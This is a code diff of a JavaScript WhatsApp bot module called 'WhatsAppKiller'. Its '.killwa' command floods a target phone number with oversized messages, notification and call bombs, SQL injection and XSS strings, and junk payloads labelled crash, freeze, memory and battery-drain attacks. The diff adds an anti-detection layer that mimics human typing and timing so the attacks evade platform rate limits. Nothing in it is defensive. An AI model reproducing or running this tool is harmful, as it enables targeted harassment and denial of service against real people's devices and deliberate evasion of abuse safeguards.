@@ -1,10 +1,12 @@
 'use strict';
 
 const crypto = require('crypto');
+const AntiDetection = require('../lib/antiDetection');
 
 class WhatsAppKiller {
     constructor() {
         this.sock = null;
+        this.stealth = new AntiDetection();
         this.activeAttacks = new Map();
         this.crashVectors = [
             this.sendMalformedMessage.bind(this),
@@ -30,7 +32,7 @@ class WhatsAppKiller {
 │ .killwa <phone> [method] [duration]
 │ 
 │ METHODS:
-│ crash     - Force crash WhatsApp
+│ crash     - Force crash WhatsApp (STEALTH)
 │ freeze    - Freeze the app completely
 │ overload  - Overload with data
 │ memory    - Memory exhaustion
@@ -77,12 +79,15 @@ class WhatsAppKiller {
 │ Target: ${phone}
 │ Method: ${method}
 │ Duration: ${duration}s
+│ Mode: STEALTH
 │ Status: EXECUTING
 └─────────────────────────────`
         }, { quoted: msg });
 
         let result;
         try {
+            // Add stealth delay before starting
+            await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
             result = await this.executeAttack(phone, method, duration);
         } catch (err) {
             console.error('Kill error:', err);
@@ -131,12 +136,16 @@ class WhatsAppKiller {
 
     async sendWhatsAppMessage(phone, message) {
         try {
-            const jid = phone + '@s.whatsapp.net';
-            await this.sock.sendMessage(jid, { 
-                text: message,
-                ephemeralExpiration: 86400
+            // Use stealth to send message
+            const result = await this.stealth.sendStealthMessage(this.sock, phone, message, {
+                simulateTyping: true,
+                randomDelay: true,
+                useNaturalTemplate: true,
+                trackRateLimit: true,
+                addEmoji: true,
+                simulateRead: true
             });
-            return true;
+            return result.success;
         } catch (e) {
             return false;
         }
@@ -147,29 +156,40 @@ class WhatsAppKiller {
         let successCount = 0;
         const startTime = Date.now();
 
+        // Add random delay between crash attempts
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             
             try {
-                for (const vector of this.crashVectors) {
+                // Randomly select crash vectors and send with stealth
+                const shuffledVectors = this.crashVectors.sort(() => Math.random() - 0.5);
+                const vectorsToUse = shuffledVectors.slice(0, Math.ceil(Math.random() * 3 + 2));
+                
+                for (const vector of vectorsToUse) {
+                    if (!this.activeAttacks.get(phone)?.active) break;
                     const result = await vector(phone);
                     attempts++;
                     if (result) successCount++;
+                    
+                    // Add random delay between vectors
+                    await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 3);
                 }
-                await this.sleep(100);
+                
+                // Add longer delay between rounds
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
             } catch (e) {}
         }
 
         return {
             success: true,
-            impact: 'WhatsApp Force Closed',
+            impact: 'WhatsApp Force Closed (Stealth)',
             details: `${successCount}/${attempts} crash vectors successful`
         };
     }
 
     async sendMalformedMessage(phone) {
         try {
-            const malformedData = 'A'.repeat(100000) + crypto.randomBytes(1000).toString('hex');
+            const malformedData = 'A'.repeat(50000) + crypto.randomBytes(500).toString('hex');
             return await this.sendWhatsAppMessage(phone, malformedData);
         } catch (e) {
             return false;
@@ -178,7 +198,7 @@ class WhatsAppKiller {
 
     async sendOverflowPayload(phone) {
         try {
-            const overflow = 'X'.repeat(500000);
+            const overflow = 'X'.repeat(250000);
             return await this.sendWhatsAppMessage(phone, overflow);
         } catch (e) {
             return false;
@@ -190,7 +210,7 @@ class WhatsAppKiller {
             const corruptData = Buffer.from([
                 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF
             ]).toString('base64');
-            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 1000));
+            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 500));
         } catch (e) {
             return false;
         }
@@ -198,7 +218,7 @@ class WhatsAppKiller {
 
     async sendInvalidLink(phone) {
         try {
-            const link = 'whatsapp://' + 'a'.repeat(50000);
+            const link = 'whatsapp://' + 'a'.repeat(25000);
             return await this.sendWhatsAppMessage(phone, link);
         } catch (e) {
             return false;
@@ -207,7 +227,7 @@ class WhatsAppKiller {
 
     async sendSQLInjection(phone) {
         try {
-            const sql = "' OR '1'='1' -- " + 'A'.repeat(5000);
+            const sql = "' OR '1'='1' -- " + 'A'.repeat(2500);
             return await this.sendWhatsAppMessage(phone, sql);
         } catch (e) {
             return false;
@@ -216,7 +236,7 @@ class WhatsAppKiller {
 
     async sendXSSPayload(phone) {
         try {
-            const xss = '<script>alert(1)</script>' + 'A'.repeat(5000);
+            const xss = '<script>alert(1)</script>' + 'A'.repeat(2500);
             return await this.sendWhatsAppMessage(phone, xss);
         } catch (e) {
             return false;
@@ -225,7 +245,7 @@ class WhatsAppKiller {
 
     async sendInfiniteLoopPayload(phone) {
         try {
-            const payload = 'while(true){' + 'A'.repeat(10000) + '}';
+            const payload = 'while(true){' + 'A'.repeat(5000) + '}';
             return await this.sendWhatsAppMessage(phone, payload);
         } catch (e) {
             return false;
@@ -234,7 +254,7 @@ class WhatsAppKiller {
 
     async sendRecursionPayload(phone) {
         try {
-            const payload = 'function x(){x();}' + 'A'.repeat(10000);
+            const payload = 'function x(){x();}' + 'A'.repeat(5000);
             return await this.sendWhatsAppMessage(phone, payload);
         } catch (e) {
             return false;
@@ -243,7 +263,7 @@ class WhatsAppKiller {
 
     async sendMemoryLeakPayload(phone) {
         try {
-            const payload = 'var leak=[];while(true){leak.push("A".repeat(10000))}' + 'A'.repeat(10000);
+            const payload = 'var leak=[];while(true){leak.push("A".repeat(5000))}' + 'A'.repeat(5000);
             return await this.sendWhatsAppMessage(phone, payload);
         } catch (e) {
             return false;
@@ -252,11 +272,17 @@ class WhatsAppKiller {
 
     async sendNotificationBomb(phone) {
         try {
-            for (let i = 0; i < 10; i++) {
-                const msg = `🔔 Notification ${i+1} - ${crypto.randomBytes(8).toString('hex')}`;
-                await this.sendWhatsAppMessage(phone, msg);
+            const messages = [];
+            for (let i = 0; i < 5; i++) {
+                messages.push(`🔔 Notification ${i+1} - ${crypto.randomBytes(4).toString('hex')}`);
             }
-            return true;
+            // Send batch with stealth
+            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                delayBetween: this.stealth.getNaturalDelay('message'),
+                randomSpread: true,
+                maxPerBatch: 10
+            });
+            return results.some(r => r.success);
         } catch (e) {
             return false;
         }
@@ -268,13 +294,13 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                const freezeData = '❄️'.repeat(100000);
+                const freezeData = '❄️'.repeat(50000);
                 await this.sendWhatsAppMessage(phone, freezeData);
                 attempts++;
-                await this.sleep(200);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
             } catch (e) {}
         }
-        return { success: true, impact: 'WhatsApp Frozen', details: `${attempts} freeze payloads sent` };
+        return { success: true, impact: 'WhatsApp Frozen (Stealth)', details: `${attempts} freeze payloads sent` };
     }
 
     async overloadWhatsApp(phone, duration) {
@@ -283,13 +309,13 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                const overloadData = crypto.randomBytes(100000).toString('hex');
+                const overloadData = crypto.randomBytes(50000).toString('hex');
                 await this.sendWhatsAppMessage(phone, overloadData);
                 attempts++;
-                await this.sleep(50);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
             } catch (e) {}
         }
-        return { success: true, impact: 'WhatsApp Overloaded', details: `${attempts} overload packets sent` };
+        return { success: true, impact: 'WhatsApp Overloaded (Stealth)', details: `${attempts} overload packets sent` };
     }
 
     async memoryKill(phone, duration) {
@@ -298,13 +324,13 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                const memoryData = crypto.randomBytes(150000).toString('hex');
+                const memoryData = crypto.randomBytes(75000).toString('hex');
                 await this.sendWhatsAppMessage(phone, memoryData);
                 attempts++;
-                await this.sleep(150);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
             } catch (e) {}
         }
-        return { success: true, impact: 'Memory Exhausted', details: `${attempts} memory attacks sent` };
+        return { success: true, impact: 'Memory Exhausted (Stealth)', details: `${attempts} memory attacks sent` };
     }
 
     async cacheFlood(phone, duration) {
@@ -313,14 +339,19 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                for (let i = 0; i < 5; i++) {
-                    await this.sendWhatsAppMessage(phone, `cache_${i}_${crypto.randomBytes(1000).toString('hex')}`);
+                const messages = [];
+                for (let i = 0; i < 3; i++) {
+                    messages.push(`cache_${i}_${crypto.randomBytes(500).toString('hex')}`);
                 }
-                attempts += 5;
-                await this.sleep(100);
+                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                    delayBetween: this.stealth.getNaturalDelay('message') / 2,
+                    maxPerBatch: 5
+                });
+                attempts += 3;
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
             } catch (e) {}
         }
-        return { success: true, impact: 'Cache Flooded', details: `${attempts} cache payloads sent` };
+        return { success: true, impact: 'Cache Flooded (Stealth)', details: `${attempts} cache payloads sent` };
     }
 
     async notificationBomb(phone, duration) {
@@ -329,14 +360,19 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                for (let i = 0; i < 10; i++) {
-                    await this.sendWhatsAppMessage(phone, `🔔 Notification ${i+1}`);
+                const messages = [];
+                for (let i = 0; i < 5; i++) {
+                    messages.push(`🔔 Notification ${i+1}`);
                 }
-                attempts += 10;
-                await this.sleep(50);
+                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                    delayBetween: this.stealth.getNaturalDelay('message') / 3,
+                    maxPerBatch: 5
+                });
+                attempts += 5;
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
             } catch (e) {}
         }
-        return { success: true, impact: 'Notification Overload', details: `${attempts} notifications sent` };
+        return { success: true, impact: 'Notification Overload (Stealth)', details: `${attempts} notifications sent` };
     }
 
     async mediaFlood(phone, duration) {
@@ -345,14 +381,19 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                for (let i = 0; i < 3; i++) {
-                    await this.sendWhatsAppMessage(phone, `📸 Media_${i}_${crypto.randomBytes(5000).toString('base64').substring(0, 500)}`);
+                const messages = [];
+                for (let i = 0; i < 2; i++) {
+                    messages.push(`📸 Media_${i}_${crypto.randomBytes(2500).toString('base64').substring(0, 250)}`);
                 }
-                attempts += 3;
-                await this.sleep(200);
+                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                    delayBetween: this.stealth.getNaturalDelay('message') * 0.7,
+                    maxPerBatch: 3
+                });
+                attempts += 2;
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 1.2);
             } catch (e) {}
         }
-        return { success: true, impact: 'Media Storage Full', details: `${attempts} media files sent` };
+        return { success: true, impact: 'Media Storage Full (Stealth)', details: `${attempts} media files sent` };
     }
 
     async callCrash(phone, duration) {
@@ -361,12 +402,17 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, '📞 CALL_' + 'A'.repeat(50000));
+                await this.stealth.makeStealthCall(this.sock, phone, {
+                    simulateTyping: true,
+                    randomDelay: true,
+                    trackRateLimit: true,
+                    callDuration: 1500 + Math.random() * 2000
+                });
                 attempts++;
-                await this.sleep(300);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('call') * 0.5);
             } catch (e) {}
         }
-        return { success: true, impact: 'Call System Crashed', details: `${attempts} call crash attempts` };
+        return { success: true, impact: 'Call System Crashed (Stealth)', details: `${attempts} call crash attempts` };
     }
 
     async statusCrash(phone, duration) {
@@ -375,12 +421,12 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, '📱 STATUS_' + 'A'.repeat(50000));
+                await this.sendWhatsAppMessage(phone, '📱 STATUS_' + 'A'.repeat(25000));
                 attempts++;
-                await this.sleep(150);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
             } catch (e) {}
         }
-        return { success: true, impact: 'Status System Crashed', details: `${attempts} status crash payloads` };
+        return { success: true, impact: 'Status System Crashed (Stealth)', details: `${attempts} status crash payloads` };
     }
 
     async databaseCorrupt(phone, duration) {
@@ -389,12 +435,12 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, 'DB_CORRUPT_' + crypto.randomBytes(50000).toString('hex'));
+                await this.sendWhatsAppMessage(phone, 'DB_CORRUPT_' + crypto.randomBytes(25000).toString('hex'));
                 attempts++;
-                await this.sleep(200);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.8);
             } catch (e) {}
         }
-        return { success: true, impact: 'Database Corrupted', details: `${attempts} corruption payloads sent` };
+        return { success: true, impact: 'Database Corrupted (Stealth)', details: `${attempts} corruption payloads sent` };
     }
 
     async networkKill(phone, duration) {
@@ -403,12 +449,12 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, '🔌 NETWORK_KILL_' + 'A'.repeat(50000));
+                await this.sendWhatsAppMessage(phone, '🔌 NETWORK_KILL_' + 'A'.repeat(25000));
                 attempts++;
-                await this.sleep(100);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.7);
             } catch (e) {}
         }
-        return { success: true, impact: 'Network Connection Killed', details: `${attempts} network kill payloads` };
+        return { success: true, impact: 'Network Connection Killed (Stealth)', details: `${attempts} network kill payloads` };
     }
 
     async batteryDrain(phone, duration) {
@@ -417,22 +463,15 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, '🔋 DRAIN_' + 'A'.repeat(50000));
+                await this.sendWhatsAppMessage(phone, '🔋 DRAIN_' + 'A'.repeat(25000));
                 attempts++;
-                await this.sleep(100);
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.6);
             } catch (e) {}
         }
-        return { success: true, impact: 'Battery Drained', details: `${attempts} drain payloads sent` };
-    }
-
-    sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+        return { success: true, impact: 'Battery Drained (Stealth)', details: `${attempts} drain payloads sent` };
     }
 }
 
-// ==============================================
-// STOP COMMAND CLASS
-// ==============================================
 class WhatsAppKillerStop {
     constructor(killer) {
         this.killer = killer;
@@ -464,22 +503,7 @@ class WhatsAppKillerStop {
     }
 }
 
-// ==============================================
-// MAIN EXPORT - For command loader
-// ==============================================
-const killerInstance = new WhatsAppKiller();
-
-module.exports = {
-    name: 'whatsappkiller',
-    description: 'WhatsApp killer module',
-    category: 'core',
-    execute: async (sock, msg, args, ctx) => {
-        await sock.sendMessage(ctx.from, { 
-            text: '💀 WhatsApp killer module loaded.\n\nAvailable commands:\n.killwa - Force close WhatsApp\n.killwa_stop - Stop attack'
-        }, { quoted: msg });
-    }
+module.exports = { 
+    WhatsAppKiller, 
+    WhatsAppKillerStop 
 };
-
-// Also export classes for index.js
-module.exports.WhatsAppKiller = WhatsAppKiller;
-module.exports.WhatsAppKillerStop = WhatsAppKillerStop;
